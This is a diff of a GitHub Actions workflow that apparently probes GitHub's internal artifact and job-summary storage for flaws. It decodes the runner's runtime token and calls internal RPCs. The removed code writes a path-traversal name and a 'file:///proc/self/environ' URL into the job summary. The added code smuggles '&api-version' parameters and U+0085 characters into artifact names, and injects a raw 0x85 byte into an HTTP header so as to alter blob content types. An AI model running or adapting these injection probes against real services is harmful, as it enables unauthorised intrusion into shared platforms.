@@ -1,17 +1,13 @@
-name: Probe Actions job summary storage
+name: Probe raw legacy Blob MIME and artifact name suffixes
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
-    paths:
-      - .github/workflows/probe_job_summary_storage.yml
 permissions:
   actions: read
   contents: read
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 3
+    timeout-minutes: 4
     steps:
       - uses: actions/github-script@v8
         env:
@@ -19,51 +15,59 @@ jobs:
         with:
           github-token: ${{ github.token }}
           script: |
-            const fs = require('node:fs');
-            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
+            const tls = require('node:tls');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
             const results = process.env.ACTIONS_RESULTS_URL;
-            const repo = process.env.GITHUB_REPOSITORY;
-            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
-            const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
-            const [, runId, jobBackendId] = scope.split(':');
-            const fields = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobBackendId};
-            const apiHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-summary-probe'};
-            const jobsResp = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`, {headers: apiHeaders});
-            if (!jobsResp.ok) throw new Error(`list jobs HTTP ${jobsResp.status}`);
-            const jobs = (await jobsResp.json()).jobs || [];
-            const job = jobs[0];
-            if (!job) throw new Error('no job');
-            const fullName = `x/../../repos/${repo}/actions/jobs/${job.id}/summary`;
-            const payload = Buffer.from(JSON.stringify({full_name: fullName, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'summary storage probe', stargazers_count: 1}));
-            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, payload.toString('utf8') + '\n');
-            const resultOrigin = new URL(results).origin;
-            async function rpc(method, data) {
-              const response = await fetch(new URL(`twirp/results.services.receiver.Receiver/${method}`, results), {method: 'POST', headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
-              const text = await response.text();
-              let json = {}; try { json = JSON.parse(text); } catch {}
-              const hasUrl = Boolean(json.logs_url || json.summary_url || json.url || json.signed_url || json.signedUrl);
-              console.log(`RPC ${method} http=${response.status} ok=${Boolean(json.ok)} has_url=${hasUrl} msg=${JSON.stringify(String(json.msg || json.message || '').slice(0,100))}`);
-              return {response, json};
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
+            const [, run, job] = scope.split(':');
+            const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
+            const base = `${new URL(results).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
+            const body = Buffer.from('{"hello":"probe"}');
+            async function twirp(method, payload) {
+              const response = await fetch(base + method, {method:'POST', headers:{Authorization:`Bearer ${token}`, 'Content-Type':'application/json'}, body:JSON.stringify(payload)});
+              return {status:response.status,data:await response.json().catch(()=>({}))};
             }
-            const docs = [fields, {...fields, step_number: 3, step_id: '3', timeline_record_id: jobBackendId}, {workflowRunBackendId: runId, workflowJobRunBackendId: jobBackendId, stepNumber: 3, stepId: '3', timelineRecordId: jobBackendId}];
-            for (const doc of docs) for (const method of ['GetJobSummarySignedBlobURL','GetStepSummarySignedBlobURL','CreateStepSummaryMetadata','UpdateStepSummaryMetadata','GetDiagnosticLogsSignedBlobURL','GetRunnerLogsSignedBlobURL']) await rpc(method, doc);
-            const paths = [
-              `actions/jobs/${job.id}/summary`,
-              `actions/jobs/${job.id}/summary/raw`,
-              `actions/jobs/${job.id}/steps/3/summary`,
-              `actions/jobs/${job.id}/steps/3/summary/raw`,
-              `actions/runs/${process.env.GITHUB_RUN_ID}/summary`,
-              `actions/runs/${process.env.GITHUB_RUN_ID}/artifacts`,
-              `actions/jobs/${job.id}/logs?summary=true`,
+            async function rawPut(url) {
+              const prefix = Buffer.from(`PUT ${url.pathname}${url.search} HTTP/1.1\r\nHost: ${url.host}\r\nConnection: close\r\nx-ms-version: 2025-01-05\r\nx-ms-blob-type: BlockBlob\r\nx-ms-blob-content-type: application/json`, 'ascii');
+              const suffix = Buffer.from(`\r\nContent-Length: ${body.length}\r\n\r\n`, 'ascii');
+              const request = Buffer.concat([prefix, Buffer.from([0x85]), suffix, body]);
+              return await new Promise((resolve,reject)=>{
+                const socket=tls.connect(443,url.hostname,{servername:url.hostname}); const chunks=[];
+                socket.setTimeout(20000,()=>socket.destroy(new Error('timeout')));
+                socket.once('secureConnect',()=>socket.write(request));
+                socket.on('data',chunk=>chunks.push(chunk)); socket.once('error',reject);
+                socket.once('end',()=>resolve(Buffer.concat(chunks).toString('latin1')));
+              });
+            }
+            const cases = [
+              ['base', `legacy-${process.env.GITHUB_RUN_ID}-base&api-version=2011-08-18`],
+              ['nel-tail', `legacy-${process.env.GITHUB_RUN_ID}-tail&api-version=2011-08-18\u0085`],
+              ['nel-before-amp', `legacy-${process.env.GITHUB_RUN_ID}-mid\u0085&api-version=2011-08-18`],
             ];
-            for (const path of paths) {
+            for (const [label,name] of cases) {
               try {
-                const first = await fetch(`https://api.github.com/repos/${repo}/${path}`, {headers: apiHeaders, redirect: 'manual'});
-                const location = first.headers.get('location');
-                const final = location ? await fetch(location) : first;
-                const body = Buffer.from(await final.arrayBuffer());
-                const type = final.headers.get('content-type') || '';
-                let json = false; try { JSON.parse(body.toString('utf8')); json = true; } catch {}
-                console.log(`REST ${path} first=${first.status} final=${final.status} type=${JSON.stringify(type)} hex=${Buffer.from(type).toString('hex')} bytes=${body.length} exact=${body.equals(payload)} json=${json}`);
-              } catch (error) { console.log(`REST ${path} ERROR=${error.name}`); }
+                const created=await twirp('CreateArtifact',{...ids,name,version:7,mime_type:'application/json'});
+                console.log(`${label} CREATE ${created.status} ok=${Boolean(created.data.ok)}`);
+                if (!created.data.ok) continue;
+                const uploadUrl=new URL(created.data.signed_upload_url||created.data.signedUploadUrl);
+                const put=await rawPut(uploadUrl);
+                console.log(`${label} PUT ${put.split('\r\n',1)[0]}`);
+                if (!/^HTTP\/1\.1 201\b/.test(put)) continue;
+                const fin=await twirp('FinalizeArtifact',{...ids,name,size:String(body.length)});
+                const id=String(fin.data.artifact_id||fin.data.artifactId||'');
+                console.log(`${label} FINALIZE ${fin.status} ok=${Boolean(fin.data.ok)} id=${/^\d+$/.test(id)?id:'none'}`);
+                if(!fin.data.ok||!/^\d+$/.test(id)) continue;
+                const api=`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
+                const redirect=await fetch(api,{redirect:'manual',headers:{Authorization:`Bearer ${process.env.GH_TOKEN}`,Accept:'application/vnd.github.v3+json'}});
+                const location=redirect.headers.get('location');
+                if(!location){console.log(`${label} REST ${redirect.status} no_location`);continue;}
+                const signed=new URL(location);
+                console.log(`${label} REST ${redirect.status} rsct=${JSON.stringify(signed.searchParams.get('rsct'))} rscd=${JSON.stringify(signed.searchParams.get('rscd'))}`);
+                for(const version of [null,'2009-09-19','2011-08-18','2013-08-15','2025-01-05']){
+                  const target=new URL(location); if(version)target.searchParams.set('api-version',version);
+                  const response=await fetch(target); const type=response.headers.get('content-type')||'';
+                  console.log(`${label} GET ${version||'default'} status=${response.status} type=${JSON.stringify(type)} hex=${Buffer.from(type,'latin1').toString('hex')}`);
+                }
+              } catch(error) { console.log(`${label} ERROR ${String(error.message).slice(0,160)}`); }
             }
